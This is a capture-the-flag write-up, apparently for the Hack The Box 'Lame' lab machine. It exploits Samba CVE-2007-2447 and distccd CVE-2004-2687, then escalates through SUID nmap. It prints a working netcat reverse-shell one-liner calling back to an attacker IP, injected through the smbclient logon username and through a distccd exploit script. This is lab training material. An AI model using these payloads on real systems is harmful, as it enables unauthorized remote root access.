# LAME

- Machine IP: `10.10.10.3`
- OS        : `Linux`
- Exploits  : SMBUserEnum `CVE-2007-2447`, distccd `CVE-2004-2687`

- Nmap recon, open ports 21 `(FTP)`, 22`(ssh)`, 139,445 `(samba/SMB shares)`, 3632 `(distccd)`
- Enumerating services hosted in these ports

- Ftp enumeration, anonymous login allowed and shows nothing in them

```bash
kali@kali:~/writeups/htb/lame$ ftp 10.10.10.3 
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```


### Root Via CVE-2007-2447

- The samba version running on the host is the 3.x version which is vulnerable in the username field

> The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.


- Lets look for anonymous access, anonymous access to `/tmp` share
```bash
SMB         10.10.10.3      445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
SMB         10.10.10.3      445    LAME             [+] hackthebox.gr\: 
SMB         10.10.10.3      445    LAME             [+] Enumerated shares
SMB         10.10.10.3      445    LAME             Share           Permissions     Remark
SMB         10.10.10.3      445    LAME             -----           -----------     ------
SMB         10.10.10.3      445    LAME             print$                          Printer Drivers
SMB         10.10.10.3      445    LAME             tmp             READ,WRITE      oh noes!
SMB         10.10.10.3      445    LAME             opt                             
SMB         10.10.10.3      445    LAME             IPC$                            IPC Service (lame server (Samba 3.0.20-Debian))
SMB         10.10.10.3      445    LAME             ADMIN$                          IPC Service (lame server (Samba 3.0.20-Debian))                         IPC Service (lame server (Samba 3.0.20-Debian))
```

- Connecting to the smbservices fails, taking a look at the [forums](https://forum.hackthebox.eu/discussion/2701/issue-with-lame) the correct syntax to connect to the machine is provided

```bash
# connection error
kali@kali:~/writeups/htb/lame$ smbclient ////10.10.10.3//tmp
do_connect: Connection to  failed (Error NT_STATUS_NOT_FOUND)

# successful login
kali@kali:~/writeups/htb/lame$ smbclient //10.10.10.3/tmp --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

- Taking a look at the opensource exploits [here](https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py), gives us some idea on what is vulnerable.
- Here the username field is vulnerable as sepcified by NDD, the payload is actually send in the connection as username parameter
- Since we have access as `anonymous` user we have to login / switch user
- We can make use of the `logon` command inthe smbclient which switches user for this task
- `logon` command requires username and password, injecting the code in the username field brings us the shell as root

```bash
smb: \> logon 
logon <username> [<password>]
smb: \> logon "/=`nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1337 >/tmp/f`"
Password: # blank password
# prompt stops since we have reverse shell kicked in
```

- Reverse Shell obtained as root, in the netcat listener session

```bash
kali@kali:~/writeups/htb/lame$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 32846
sh: no job control in this shell
sh-3.2# whoami;hostname
root
lame
```

- Machine owned via CVE-2007-2447

### Root via CVE-2004-2687

> distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.

- The requirements for the application to be vulnerable is open port on `3632` which we have

```bash
kali@kali:~/writeups/htb/lame$ ./distccd-CVE-2004-2687.py -t 10.10.10.3 -c whoami
[OK] Connected to remote service

--- BEGIN BUFFER ---

daemon


--- END BUFFER ---

[OK] Done.
```

- Command exection checked, lets obtain reverse shell like the one mentioned above `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1337 >/tmp/f`

```bash
kali@kali:~/writeups/htb/lame$ ./distccd-CVE-2004-2687.py -t 10.10.10.3 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1337 >/tmp/f"
[OK] Connected to remote service
[KO] Socket Timeout
```
- Obtained reverse shell as `daemon` user
```bash
kali@kali:~/writeups/htb/lame$ nc -lvnp 1337                                                                                                 [9/9]
listening on [any] 1337 ...                                                                                                                       
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 49843                                                                                         
sh: no job control in this shell                                                                                                                  
sh-3.2$ whoami;hostname
daemon
lame
```

- Lets find setuid binaries in the system

```bash
sh-3.2$ find / -perm -u=s 2>/dev/null   
/bin/umount                                                                                                                      
/bin/fusermount                                                                                                                  
/bin/su
/bin/mount
..[snip]..
/usr/bin/nmap
..[snip]..
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
```

- lets open nmap in the interactive option which can be used to execute commands

```bash
sh-3.2$ /usr/bin/nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
root
system() execution of command failed
nmap> !hostname
lame
system() execution of command failed
```

- Machine owned via CVE-2004-2687 and SUID binaries